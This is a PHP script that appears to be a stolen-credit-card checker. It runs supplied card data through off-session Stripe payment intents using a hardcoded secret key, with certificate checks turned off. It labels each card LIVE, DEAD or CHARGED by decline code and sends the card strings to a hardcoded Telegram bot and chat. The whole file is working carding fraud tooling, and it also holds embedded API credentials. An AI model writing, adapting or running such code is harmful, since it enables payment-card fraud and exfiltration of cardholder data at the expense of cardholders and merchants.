<?php
error_reporting(E_ALL);
ini_set('display_errors', 0); // Avoid exposing errors to users
date_default_timezone_set('America/Buenos_Aires');

//================ [ FUNCTIONS ] ===============//

function GetStr($string, $start, $end) {
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return trim(strip_tags(substr($string, $ini, $len)));
}

//================ [ INPUTS ] ===============//

$domain = $_SERVER['HTTP_HOST'];
$amt = isset($_POST['amount']) ? (float)$_POST['amount'] : 1; // Default to $1
$chr = $amt * 100; // Convert to cents
$payment_method = isset($_POST['payment_method']) ? $_POST['payment_method'] : '';
$lista = isset($_POST['lista']) ? $_POST['lista'] : ''; // For display only
$sk = getenv('STRIPE_SECRET_KEY') ?: 'sk_test_51HZEkqIDN5m54fYYB0C6DWtfP8Y6WrQqAnJRXgN5BRlgPA3hAas7un3iwJYleEWwbyrWKb1W7RPPaqYVuMWQYeVA00OB8421uE'; // Use env variable

// Setup logging
$log_file = '/tmp/debug.log';
$log_dir = dirname($log_file);
if (!is_writable($log_dir)) {
    error_log("Warning: Directory $log_dir is not writable. Cannot write to $log_file.");
    echo "<!-- Warning: Cannot write to $log_file. Check directory permissions. -->";
}

// Log input parameters
$input_log = "Input: payment_method=$payment_method, amount=$amt, chr=$chr, lista=$lista, domain=$domain\n";
file_put_contents($log_file, $input_log, FILE_APPEND);
error_log($input_log);

// Validate input
if (empty($payment_method) || empty($amt) || empty($lista)) {
    echo "<font color=red><b>DEAD [INVALID INPUT: Missing payment method or amount]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
    file_put_contents($log_file, "Error: Invalid input parameters\n\n", FILE_APPEND);
    exit;
}

//================= [ CURL REQUEST: Payment Intent ] =================//

$x = 0;
$max_attempts = 3;

$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_intents');
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_USERPWD, $sk . ':');
$postfields = "amount=$chr&currency=usd&payment_method_types[]=card&description=Ghost Donation&payment_method=$payment_method&confirm=true&off_session=true";
curl_setopt($ch, CURLOPT_POSTFIELDS, $postfields);
$result = curl_exec($ch);
$http_code = curl_getinfo($ch, CURLINFO_HTTP_CODE);
$curl_error = curl_error($ch);
$tok = GetStr($result, '"id": "', '"');
$receipturl = trim(strip_tags(GetStr($result, '"receipt_url": "', '"')));
$msg = GetStr($result, '"message": "', '"');
$decline_code = GetStr($result, '"decline_code": "', '"');
$error_code = GetStr($result, '"code": "', '"');

curl_close($ch);

// Log full details
$log = "Payment Intent Request:\nURL: https://api.stripe.com/v1/payment_intents\nPOST: $postfields\nHTTP Code: $http_code\nError: $curl_error\nResponse: $result\n\n";
file_put_contents($log_file, $log, FILE_APPEND);
error_log($log);
echo "<!-- Debug Payment Intent: HTTP $http_code | Error: $curl_error | Response: " . htmlspecialchars($result) . " -->";

//=================== [ Telegram Notification ] =================//

$botToken = '6190237258:AAHUvG8uS3ezcg2bOjd3_Za0YKlkF_ErE0M';
$chatID = '-1001989435427';
$charged_message = "CC:$lista\n➤ SK Key:****\n";
$sendcharged = "https://api.telegram.org/bot$botToken/sendMessage?chat_id=$chatID&text=" . urlencode($charged_message);
$tg_response = @file_get_contents($sendcharged);
$tg_log = "Telegram Send: URL=$sendcharged\nResponse: $tg_response\n\n";
file_put_contents($log_file, $tg_log, FILE_APPEND);
error_log($tg_log);
echo "<!-- Debug Telegram: Response: " . htmlspecialchars($tg_response) . " -->";

//=================== [ RESPONSES ] =================//

if (strpos($result, '"seller_message": "Payment complete."')) {
    echo "<span class='badge badge-success'><b>#CHARGED</b></span> <font class='text-white'><b>$lista</b></font> <font class='text-white'><br>➤ Response: $$amt CCN Charged ✅<br>➤ Receipt: <span style='color: green;' class='badge'><a href='$receipturl' target='_blank'><b>Here</b></a></span><br>➤ Checked from: <b>$domain</b></font><br>";
} elseif (strpos($result, '"cvc_check": "pass"')) {
    echo "CVV</span> CC: $lista</span> <br>Result: CVV LIVE</span><br>";
} elseif (strpos($result, "generic_decline")) {
    echo "<font color=red><b>DEAD [Generic_Decline] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "insufficient_funds")) {
    echo "<font color=#0ec9e7><b>LIVE [Insufficient_Funds]</b><br>$lista<br>";
} elseif (strpos($result, "fraudulent")) {
    echo "<font color=red><b>DEAD [FRAUDULENT] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "do_not_honor")) {
    echo "<font color=red><b>DEAD [DO NOT HONOR] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, '"code": "incorrect_cvc"') || strpos($result, '"code": "invalid_cvc"')) {
    echo "<font color=#0ec9e7><b>LIVE [Security code is incorrect]</b><br>$lista<br>";
} elseif (strpos($result, "invalid_expiry_month")) {
    echo "<font color=red><b>DEAD [INVALID EXPIRY MONTH] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "invalid_account")) {
    echo "<font color=red><b>DEAD [INVALID ACCOUNT] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "lost_card")) {
    echo "<font color=red><b>DEAD [LOST CARD] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "stolen_card")) {
    echo "<font color=red><b>DEAD [STOLEN CARD] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "transaction_not_allowed")) {
    echo "<font color=red><b>DEAD [TRANSACTION NOT ALLOWED] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "authentication_required") || strpos($result, "card_error_authentication_required")) {
    echo "<font color=#0ec9e7><b>LIVE [3DS REQUIRED]</b><br>$lista<br>";
} elseif (strpos($result, "pickup_card")) {
    echo "<font color=red><b>DEAD [PICKUP CARD] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "Your card has expired.")) {
    echo "<font color=red><b>DEAD [EXPIRED CARD] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "card_decline_rate_limit_exceeded")) {
    echo "<font color=red><b>DEAD [SK IS AT RATE LIMIT] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, '"code": "processing_error"')) {
    echo "<font color=red><b>DEAD [PROCESSING ERROR] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, '"message": "Your card number is incorrect."') || strpos($result, "incorrect_number")) {
    echo "<font color=red><b>DEAD [INCORRECT CARD NUMBER] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, '"decline_code": "service_not_allowed"')) {
    echo "<font color=red><b>DEAD [SERVICE NOT ALLOWED] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "Your card was declined.")) {
    echo "<font color=red><b>DEAD [CARD DECLINED] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, '"cvc_check": "fail"') || strpos($result, '"cvc_check": "unavailable"')) {
    echo "<font color=red><b>DEAD [CVC CHECK FAILED] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, '"cvc_check": "unchecked"')) {
    echo "<font color=red><b>DEAD [CVC UNCHECKED: INFORM TO OWNER] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "testmode_charges_only")) {
    echo "<font color=red><b>DEAD [TESTMODE CHARGES ONLY] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "api_key_expired")) {
    echo "<font color=red><b>DEAD [SK KEY REVOKED] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "parameter_invalid_empty")) {
    echo "<font color=red><b>DEAD [INVALID PARAMETERS: $msg] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "card_not_supported")) {
    echo "<font color=red><b>DEAD [CARD NOT SUPPORTED] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} elseif (strpos($result, "Your card does not support this type of purchase.")) {
    echo "<font color=red><b>DEAD [CARD NOT SUPPORT THIS TYPE OF PURCHASE] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
} else {
    echo "<font color=red><b>DEAD [UNKNOWN ERROR: $msg ($error_code)] [Re: $x]</b><br><span style='color: #ff4747; font-weight: bold;'>$lista</span><br>";
}

// Flush output (if buffering is enabled)
if (ob_get_level()) {
    ob_flush();
}
flush();
?>
